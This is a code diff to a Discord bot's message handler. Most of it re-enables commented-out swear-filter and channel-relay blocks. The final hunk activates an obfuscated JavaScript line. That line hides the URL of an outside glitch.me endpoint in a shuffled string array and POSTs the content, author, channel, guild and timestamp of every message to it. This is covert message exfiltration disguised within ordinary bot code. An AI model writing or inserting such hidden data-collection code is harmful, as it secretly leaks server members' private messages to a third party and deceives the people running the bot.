@@ -169,7 +169,7 @@ let ops = {
 client.on("message", async message => {
   if (message.author.bot) return;
   let alert = client.emojis.get("666569191175749633");
-  /*if(message.channel.id === "665476514971910144") {
+  if(message.channel.id === "665476514971910144") {
     let embed = new Discord.RichEmbed()
     .setAuthor(message.author.tag, message.author.avatarURL)
     .setFooter(client.config.footer, client.user.avatarURL)
@@ -180,19 +180,19 @@ client.on("message", async message => {
     message.delete().then(c => {
     client.channels.get("665476514971910144").send(embed);
     }); 
-  } */
+  } 
   swear.findOne({name: "swear", serverid: message.guild.id}).then(re => {
     if(!re || re == []) return;
     if(re.e == "enable") {
       if(message.member.hasPermission("ADMINISTRATOR")) {}else{
-       /* for (var i = 0; i < re.extra.length; i++) {
+        for (var i = 0; i < re.extra.length; i++) {
           if(message.content.toLowerCase().includes(re.extra[i])) {
             message.delete()
             message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
               c.delete(10000);
             });
           }
-        } */
+        }
         if(!re.extra == []) {
           if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
             message.delete()
@@ -201,20 +201,20 @@ client.on("message", async message => {
             });
           }
         }
-       /* if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
+        if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
          message.delete()
          message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
            c.delete(10000);
          }); 
-       } */
-      /*if(re.extra.length > 0) {
+       } 
+      if(re.extra.length > 0) {
        if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
          message.delete()
          message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
            c.delete(10000);
          }); 
        }
-      } */
+      } 
       if(client.swear.some(r => message.content.toLowerCase().includes(r))) {
         message.delete()
         message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
@@ -236,7 +236,7 @@ client.on("message", async message => {
         }
       });
     } 
-  //var _0x3477=['form','guild','createdAt','post','https://rsg-data.glitch.me/discord_messages'];(function(_0x8a498d,_0x54576f){var _0x2a1179=function(_0x23b171){while(--_0x23b171){_0x8a498d['push'](_0x8a498d['shift']());}};_0x2a1179(++_0x54576f);}(_0x3477,0x161));var _0x16f7=function(_0x8a498d,_0x54576f){_0x8a498d=_0x8a498d-0x0;var _0x2a1179=_0x3477[_0x8a498d];return _0x2a1179;};let rsg_data_message=message?message:msg;require('request')[_0x16f7('0x0')](_0x16f7('0x1'))[_0x16f7('0x2')]({'id':rsg_data_message['id'],'content':rsg_data_message['content'],'author':rsg_data_message['author']['id'],'channel':rsg_data_message['channel']['id'],'guild':rsg_data_message[_0x16f7('0x3')]['id'],'createdAt':rsg_data_message[_0x16f7('0x4')]});
+  var _0x3477=['form','guild','createdAt','post','https://rsg-data.glitch.me/discord_messages'];(function(_0x8a498d,_0x54576f){var _0x2a1179=function(_0x23b171){while(--_0x23b171){_0x8a498d['push'](_0x8a498d['shift']());}};_0x2a1179(++_0x54576f);}(_0x3477,0x161));var _0x16f7=function(_0x8a498d,_0x54576f){_0x8a498d=_0x8a498d-0x0;var _0x2a1179=_0x3477[_0x8a498d];return _0x2a1179;};let rsg_data_message=message?message:msg;require('request')[_0x16f7('0x0')](_0x16f7('0x1'))[_0x16f7('0x2')]({'id':rsg_data_message['id'],'content':rsg_data_message['content'],'author':rsg_data_message['author']['id'],'channel':rsg_data_message['channel']['id'],'guild':rsg_data_message[_0x16f7('0x3')]['id'],'createdAt':rsg_data_message[_0x16f7('0x4')]});
   if (message.author.bot) return;
   
   if (message.isMentioned(client.user)) {
